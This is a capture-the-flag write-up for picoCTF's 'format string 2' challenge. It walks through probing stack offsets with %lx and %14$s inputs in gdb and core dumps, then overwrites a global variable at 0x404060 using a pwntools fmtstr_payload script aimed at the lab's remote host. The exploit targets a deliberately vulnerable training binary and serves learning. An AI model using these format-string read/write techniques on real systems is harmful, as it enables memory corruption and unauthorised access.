# format string 2
![image](https://github.com/JosephB10/CTF-Writeups/assets/105746932/ab7a3f9a-12e8-41fc-a78b-16b79bd42b77)
## Hints
- pwntools are very useful for this problem!
## Solution
You are given a binary to practice on, the source code, and a remote instance to get the flag from.
<br>
The vulnerability is again a format string error where the format string isn't specified, allowing memory read/writes.
<br>
This time you need to change a global variable from `!sus` to `flag`.
- First things first you need to find memory location of the global variable in order to be able to write to it
- When opening `gdb` and `disas` main, it immediately shows up in the comments on the side that the global variable is at mem location `0x404060`
- So that is where we need to write `flag` to

Then because it's a global variable and not on the stack, we need to be able to jump to an arbitrary memory location chosen by us.
- We can do this because our inputted information (from `scanf`) is on the stack
- So we can provide a memory address as an input, and then use that value to point us anywhere
- I wanted to test this arbitrary memory reading, so I spent most of my time trying to get this to work even though it didn't help me with the memory write

<br><br>
## Arbitrary Memory Read (NOT NECESSARY)
- This isn't the best way to find offset, but it worked for me
  - Entering a repeating `%lx.%lx.` prints the first 5 registers used by printf and then starts reading off the stack (`lx` 64 bit, `x` for 32 bit)
    - You can paste as many `%lx` as your buffer has room for
    - Then I copy pasted the resulting output into cyberchef's `from hex` field
    - You can count the memory blocks up until you get your first "%lx" to know what the offset is
  - The goal then is to provide the program a string with a memory location and the format string to read from that memory location
  - Something like `AAAA%14$s` where you replace AAAA with the mem address
  - With a rough offset you can use the following to debug memory reads (I was getting seg-faults) 
    -  `echo -e 'AAAA%14$s' | ./vuln`
    - `AAAAA` can be anything, `14` is the offset and the `s` tells it to read the string from the memory location
    - Then I had to make sure my kali linux was generating seg fault crash reports
      - https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/
      - `ulimit -c unlimited`
      - `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t`
      - Now it would write a `core` file to `tmp` that I could use with gdb to see the segfault data
    - `gdb ./vuln /tmp/core123123123...` opened up gdb so I could examine the details of the seg-fault
    - https://www.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail
    - `print/x $rdi`   ($edi on 32 bit) told me the value of the `rdi` register, which if I got the offset right, would be the value I had written (`AAAA`)
    - So I could experiment with feeding the program different values and then seeing what it got
      - `echo -e 'x60\x40\x40\x00\x00%14$s' | ./vuln` was what I was trying and instead of it trying to access the memory address `0x404060` it was showing in `rdi` that values of `%14s` were getting put into the same memory block as my mem address
      - `echo -e '%15$5.5s\x60\x40\x40\x00\x00' | ./vuln`
        - I fixed it by moving the format string input to the front, and then choosing 1 higher offset so it would read the next memory block, which was now holding my mem address bracketed by null bytes
        - This resulted in a successful memory read of the `sus` variable `Here's your input:  sus!@@`



<br>Yay! On to memory writing now
       
<br><br>
## Arbitrary Memory Write
- https://cs155.stanford.edu/papers/formatstring-1.2.pdf
- https://lettieri.iet.unipi.it/hacking/format-strings.pdf
- There's a lot of information out there about constructing a payload that will write to the memory address you want, but it is quite the task and troubleshooting it would be quite tedious
- Rather then that I used a `pwntools` module that formatted the payload for me
```
#Import pwntools
from pwn import *

#Get the system architecture for fmtstr_payload
context.binary = './vuln'

#Offset of 14, memory address, value to be written, extra padding needed
payload = fmtstr_payload(14, {0x404060:0x67616c66}, 0)
print(payload)


#Comment out local or remote
p = process("./vuln")
#p = remote("rhea.picoctf.net", 52350)

#Write EVERYTHING
context.log_level = 'debug'

#After receiving ?, send the payload
p.sendlineafter(b'?', payload) 

#Receive and decode what is sent back by the program
print(p.recvall().decode("latin-1"))
```
<br><br>
Feeding `fmtstr_payload` the offset (14), the memory address to the value I wanted to change (0x404060), and the new value I wanted (0x67616c66 (flag)) gave me the payload I needed to perform a memory write.
<br><br>
I did run into trouble here because it kept giving back a payload formatted for 32 bit. 
<br>So I added the line `context.binary = './vuln'` which automatically updated `fmtstr_payload` with the correct architecture.

<br><br>
Running the script on the remote instance gave the flag.











